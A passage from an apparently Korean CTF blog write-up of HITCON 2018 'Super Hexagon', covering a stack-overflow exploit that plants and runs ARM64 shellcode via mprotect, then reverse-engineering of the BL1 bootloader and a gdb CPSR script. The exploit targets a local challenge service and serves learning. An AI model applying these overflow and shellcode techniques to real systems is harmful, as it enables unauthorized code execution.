</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>c<span style="color:#f92672">/</span>Users<span style="color:#f92672">/</span>msh<span style="color:#f92672">/</span>Desktop<span style="color:#f92672">/</span>SuperHexagon<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">-</span><span style="color:#ae81ff">2044407</span>c141e2a3a49d9fb57b62c73ee<span style="color:#f92672">/</span>release<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">/</span>ex.py:<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https:<span style="color:#75715e">//docs.pwntools.com/#bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  sla <span style="color:#f92672">=</span> lambda x,y : p.<span style="color:#a6e22e">sendlineafter</span>(x,y)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Paused</span> (press any to <span style="color:#66d9ef">continue</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span>ERROR:   [VMM] RWX pages are not allowed
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Closed connection to localhost port <span style="color:#ae81ff">6666</span>
</span></span></code></pre></div><p>mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2가 rwx 페이지를 막는다.
그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.</p>
<h2 id="exploit-code-code-execution">Exploit code (code execution)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-code-execution">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>stack_x29_x30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0019bb0</span>
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> stack_x29_x30<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x100
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x7ffeffffd01e </span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>안정적으로 쉘코드를 삽입할 수 있다.
여기 커널에선 read가 1바이트씩 읽는 것으로 구현되므로 직접 1바이트씩 읽어서 저정하도록 만들어야한다.</p>
<h1 id="reverse-engineering-bl1">Reverse engineering BL1<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-bl1">#</a></h1>
<p>BL1은 flash rom 위에서 돌면서 코드 무결성을 보장한다.
qemu의 hitcon 머신은 처음에 간단한 초기화를 진행하고 바로 부팅을 시작한다.
arm_load_kernel 코드를 직접 확인해보면, cpu는 처음에 reset을 수행하게 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span> 		hwaddr flashsize <span style="color:#f92672">=</span> memmap[VIRT_FLASH].size <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    hwaddr flashbase <span style="color:#f92672">=</span> memmap[VIRT_FLASH].base;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash0&#34;</span>, flashbase, flashsize, bios_name, secure_sysmem);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash1&#34;</span>, flashbase <span style="color:#f92672">+</span> flashsize, flashsize, NULL, sysmem);
</span></span></code></pre></div><p>여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hitcon_init</span>(MachineState <span style="color:#f92672">*</span>machine)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> ...
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// prepare boot info
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    bootinfo.ram_size <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>ram_size;
</span></span><span style="display:flex;"><span>    bootinfo.nb_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    bootinfo.board_id <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    bootinfo.firmware_loaded <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    bootinfo.loader_start <span style="color:#f92672">=</span> memmap[VIRT_MEM].base;
</span></span><span style="display:flex;"><span>    bootinfo.kernel_filename <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>kernel_filename;
</span></span><span style="display:flex;"><span>    bootinfo.kernel_cmdline <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>kernel_cmdline;
</span></span><span style="display:flex;"><span>    bootinfo.initrd_filename <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>initrd_filename;
</span></span><span style="display:flex;"><span>    bootinfo.skip_dtb_autoload <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">arm_load_kernel</span>(<span style="color:#a6e22e">ARM_CPU</span>(first_cpu), <span style="color:#f92672">&amp;</span>bootinfo);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">arm_load_kernel</span>(ARMCPU <span style="color:#f92672">*</span>cpu, MachineState <span style="color:#f92672">*</span>ms, <span style="color:#66d9ef">struct</span> arm_boot_info <span style="color:#f92672">*</span>info)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    CPUState <span style="color:#f92672">*</span>cs;
</span></span><span style="display:flex;"><span>    AddressSpace <span style="color:#f92672">*</span>as <span style="color:#f92672">=</span> <span style="color:#a6e22e">arm_boot_address_space</span>(cpu, info);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> boot_el;
</span></span><span style="display:flex;"><span>    CPUARMState <span style="color:#f92672">*</span>env <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>cpu<span style="color:#f92672">-&gt;</span>env;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nb_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * CPU objects (unlike devices) are not automatically reset on system
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * reset, so we must always register a handler to do so. If we&#39;re
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * actually loading a kernel, the handler is also responsible for
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * arranging that we start it correctly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (cs <span style="color:#f92672">=</span> first_cpu; cs; cs <span style="color:#f92672">=</span> <span style="color:#a6e22e">CPU_NEXT</span>(cs)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">qemu_register_reset</span>(do_cpu_reset, <span style="color:#a6e22e">ARM_CPU</span>(cs));
</span></span><span style="display:flex;"><span>        nb_cpus<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * The board code is not supposed to set secure_board_setup unless
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * running its code in secure mode is actually possible, and KVM
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * doesn&#39;t support secure.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>(<span style="color:#f92672">!</span>(info<span style="color:#f92672">-&gt;</span>secure_board_setup <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">kvm_enabled</span>()));
</span></span><span style="display:flex;"><span>    info<span style="color:#f92672">-&gt;</span>kernel_filename <span style="color:#f92672">=</span> ms<span style="color:#f92672">-&gt;</span>kernel_filename;
</span></span><span style="display:flex;"><span>    info<span style="color:#f92672">-&gt;</span>kernel_cmdline <span style="color:#f92672">=</span> ms<span style="color:#f92672">-&gt;</span>kernel_cmdline;
</span></span><span style="display:flex;"><span>    info<span style="color:#f92672">-&gt;</span>initrd_filename <span style="color:#f92672">=</span> ms<span style="color:#f92672">-&gt;</span>initrd_filename;
</span></span><span style="display:flex;"><span>    info<span style="color:#f92672">-&gt;</span>dtb_filename <span style="color:#f92672">=</span> ms<span style="color:#f92672">-&gt;</span>dtb;
</span></span><span style="display:flex;"><span>    info<span style="color:#f92672">-&gt;</span>dtb_limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Load the kernel.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>info<span style="color:#f92672">-&gt;</span>kernel_filename <span style="color:#f92672">||</span> info<span style="color:#f92672">-&gt;</span>firmware_loaded) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arm_setup_firmware_boot</span>(cpu, info);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arm_setup_direct_kernel_boot</span>(cpu, info);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다.
IROM 내부에서 돌아가는 BL0를 에뮬레이션된 부분이라고 생각하면 된다.</p>
<p>이제 실질적인 부트로더 BL1을 분석한다.
0x0 번지부터 의사코드를 확인해보면 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>void Reset(void)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30c50830</span>;
</span></span><span style="display:flex;"><span>  InstructionSynchronizationBarrier();
</span></span><span style="display:flex;"><span>  vbar_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000</span>;
</span></span><span style="display:flex;"><span>  InstructionSynchronizationBarrier();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el3;
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100a</span>;
</span></span><span style="display:flex;"><span>  InstructionSynchronizationBarrier();
</span></span><span style="display:flex;"><span>  scr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x238</span>;
</span></span><span style="display:flex;"><span>  mdcr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18000</span>;
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> daif;
</span></span><span style="display:flex;"><span>  daif <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffffeff</span>;
</span></span><span style="display:flex;"><span>  cptr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  FUN_00001004(DAT_000000b8,DAT_000000c0);
</span></span><span style="display:flex;"><span>  FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8);
</span></span><span style="display:flex;"><span>  FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8);
</span></span><span style="display:flex;"><span>  FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100);
</span></span><span style="display:flex;"><span>  FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8);
</span></span><span style="display:flex;"><span>  spsel <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  FUN_00000514();
</span></span><span style="display:flex;"><span>  FUN_000007f4();
</span></span><span style="display:flex;"><span>  FUN_00000fa8();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다.
시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.</p>
<h2 id="cpsr-structure--gdbscript">CPSR structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#cpsr-structure--gdbscript">#</a></h2>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4e3c2094116dea72ad3cb4822b6b362b.png" alt=""  />

처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다.
위는 CPSR의 구조이다.
이를 참고하여 cpsr을 확인하는 커맨드를 추가하는 gdbscript를 작성했다.
각각의 ELx에 대해서 SP_EL0와 SP_Elx 두 가지 옵션의 전환이 지원된다.
이를 파싱하는 스크립트를 작성했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CPSR</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(CPSR, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;cpsr&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        cpsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$cpsr&#34;</span>)))
</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;| &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
